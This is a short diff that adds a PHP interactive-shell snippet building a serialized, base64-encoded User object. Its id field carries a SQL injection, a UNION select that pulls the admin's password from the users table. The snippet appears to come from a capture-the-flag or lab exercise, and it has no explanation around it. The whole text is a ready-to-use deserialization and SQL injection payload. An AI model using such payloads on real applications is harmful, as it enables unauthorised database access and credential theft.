@@ -1,0 +1,5 @@
+php -a
+require('config.php');
+$m = new User();
+$m->id = "110' UNION select password, NULL,NULL,NULL from users where `username`='admin';  --";
+echo base64_encode(serialize($m));
